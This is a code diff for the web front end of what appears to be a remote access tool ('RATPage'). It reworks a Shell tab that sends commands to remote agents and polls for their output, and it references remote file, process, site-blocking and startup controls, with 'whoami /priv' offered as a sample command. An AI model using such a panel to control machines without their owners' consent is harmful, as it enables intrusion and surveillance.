@@ -796,46 +796,25 @@ function ChatTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDeta
 // ─── Shell tab ────────────────────────────────────────────────────────────────
 
 interface ShellEntry {
+  id: string
   cmd: string
-  output: string
+  output: string | null
   ts: string
-  pending?: boolean
 }
 
-function ShellTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDetail | null; onRefresh: () => void }) {
+function ShellTab({ agent }: { agent: Agent }) {
   const [input, setInput] = useState('')
   const [history, setHistory] = useState<ShellEntry[]>([])
   const [cmdHistory, setCmdHistory] = useState<string[]>([])
   const [historyIdx, setHistoryIdx] = useState(-1)
   const [running, setRunning] = useState(false)
   const bottomRef = useRef<HTMLDivElement>(null)
-  const prevMsgCount = useRef(0)
+  // Map of command_id -> entry id so we can match replies
+  const pendingRef = useRef<Record<string, string>>({})
 
   useEffect(() => {
     bottomRef.current?.scrollIntoView({ behavior: 'smooth' })
   }, [history])
-
-  // Watch for shell replies in messages
-  useEffect(() => {
-    const msgs = detail?.messages ?? []
-    if (msgs.length > prevMsgCount.current) {
-      const newMsgs = msgs.slice(prevMsgCount.current)
-      prevMsgCount.current = msgs.length
-      for (const m of newMsgs) {
-        if (m.sender === 'agent' && !m.body.startsWith('[file_read:') && !m.body.startsWith('[file_')) {
-          setHistory(prev => {
-            // Replace the last pending entry with the real output
-            const idx = prev.findLastIndex(e => e.pending)
-            if (idx === -1) return prev
-            const updated = [...prev]
-            updated[idx] = { ...updated[idx], output: m.body, pending: false }
-            return updated
-          })
-          setRunning(false)
-        }
-      }
-    }
-  }, [detail?.messages])
 
   async function run() {
     const cmd = input.trim()
@@ -844,14 +823,50 @@ function ShellTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDet
     setHistoryIdx(-1)
     setCmdHistory(prev => [cmd, ...prev].slice(0, 50))
     setRunning(true)
-    setHistory(prev => [...prev, { cmd, output: '', ts: new Date().toISOString(), pending: true }])
-    await sendCommand(agent.id, 'shell', { command: cmd })
-    // Poll for reply
+
+    const entryId = String(Date.now())
+    const sentAt = new Date().toISOString()
+    setHistory(prev => [...prev, { id: entryId, cmd, output: null, ts: sentAt }])
+
+    const result = await sendCommand(agent.id, 'shell', { command: cmd })
+    const commandId = result?.command_id ?? result?.id ?? null
+
+    if (commandId) {
+      pendingRef.current[commandId] = entryId
+    }
+
+    // Poll rat_messages for a new agent message that arrived after we sent the command
     let attempts = 0
-    const poll = setInterval(() => {
+    const poll = setInterval(async () => {
       attempts++
-      onRefresh()
-      if (attempts > 30) { clearInterval(poll); setRunning(false) }
+      try {
+        const res = await fetch(`/api/rat/agents/${encodeURIComponent(agent.id)}/messages?after=${encodeURIComponent(sentAt)}`)
+        if (res.ok) {
+          const msgs: { id: number; sender: string; body: string; created_at: string }[] = await res.json()
+          // Find the first agent reply after our sent time that looks like shell output
+          const reply = msgs.find(m =>
+            m.sender === 'agent' &&
+            !m.body.startsWith('[file_read:') &&
+            !m.body.startsWith('[file_upload') &&
+            !m.body.startsWith('[file_delete') &&
+            !m.body.startsWith('[block_sites') &&
+            !m.body.startsWith('[unblock_sites') &&
+            !m.body.startsWith('[process_kill') &&
+            !m.body.startsWith('[startup')
+          )
+          if (reply) {
+            clearInterval(poll)
+            setHistory(prev => prev.map(e => e.id === entryId ? { ...e, output: reply.body } : e))
+            setRunning(false)
+            return
+          }
+        }
+      } catch { /* ignore */ }
+      if (attempts > 40) {
+        clearInterval(poll)
+        setHistory(prev => prev.map(e => e.id === entryId ? { ...e, output: '[timed out — no response]' } : e))
+        setRunning(false)
+      }
     }, 600)
   }
 
@@ -878,29 +893,28 @@ function ShellTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDet
           Shell · {agent.alias || agent.hostname}
           <span className="ml-2 text-[10px]" style={{ color: '#3a3537' }}>↑↓ history</span>
         </span>
-        <Btn small onClick={() => { setHistory([]); prevMsgCount.current = detail?.messages?.length ?? 0 }}>
-          Clear
-        </Btn>
+        <Btn small onClick={() => setHistory([])}>Clear</Btn>
       </PanelHeader>
 
       {/* Output area */}
-      <div className="overflow-y-auto p-3 font-mono text-[12px] flex flex-col gap-3" style={{ minHeight: 360, maxHeight: 420, background: '#0a0709' }}>
+      <div className="overflow-y-auto p-3 font-mono text-[12px] flex flex-col gap-3"
+        style={{ minHeight: 360, maxHeight: 420, background: '#0a0709' }}>
         {history.length === 0 && (
           <p className="text-[12px]" style={{ color: '#3a3537' }}>
             Run a command to see output. Try: <span style={{ color: '#5d585c' }}>whoami /priv</span>
           </p>
         )}
-        {history.map((entry, i) => (
-          <div key={i}>
+        {history.map(entry => (
+          <div key={entry.id}>
             <div className="flex items-center gap-2 mb-1">
               <span style={{ color: '#dc2625' }}>❯</span>
               <span style={{ color: '#e5e3e4' }}>{entry.cmd}</span>
               <span className="text-[10px] ml-auto" style={{ color: '#3a3537' }}>{ago(entry.ts)}</span>
             </div>
-            {entry.pending
+            {entry.output === null
               ? <div className="flex items-center gap-1.5 pl-4" style={{ color: '#5d585c' }}>
                   <span className="animate-pulse">▋</span>
-                  <span className="text-[11px]">waiting for response…</span>
+                  <span className="text-[11px]">waiting…</span>
                 </div>
               : entry.output
                 ? <pre className="pl-4 whitespace-pre-wrap break-all leading-relaxed" style={{ color: '#a89fa1' }}>{entry.output}</pre>
@@ -912,7 +926,8 @@ function ShellTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDet
       </div>
 
       {/* Input */}
-      <div className="flex items-center gap-2 px-3 py-2 border-t" style={{ borderColor: '#2e292b', background: '#0a0709' }}>
+      <div className="flex items-center gap-2 px-3 py-2 border-t"
+        style={{ borderColor: '#2e292b', background: '#0a0709' }}>
         <span style={{ color: '#dc2625' }} className="font-mono text-[13px] shrink-0">❯</span>
         <input
           value={input}
@@ -1138,7 +1153,7 @@ export default function RATPage() {
                 {tab === 'processes' && <ProcessesTab  agent={selectedAgent} detail={detail} onRefresh={fetchDetail} />}
                 {tab === 'sites'     && <SitesTab      agent={selectedAgent} detail={detail} onRefresh={fetchDetail} />}
                 {tab === 'chat'      && <ChatTab       agent={selectedAgent} detail={detail} onRefresh={fetchDetail} />}
-                {tab === 'shell'     && <ShellTab      agent={selectedAgent} detail={detail} onRefresh={fetchDetail} />}
+                {tab === 'shell'     && <ShellTab      agent={selectedAgent} />}
                 {tab === 'info'      && <InfoTab       agent={selectedAgent} onAliasChange={fetchAgents} onDelete={() => { setSelected(null); fetchAgents() }} />}
               </>
             )
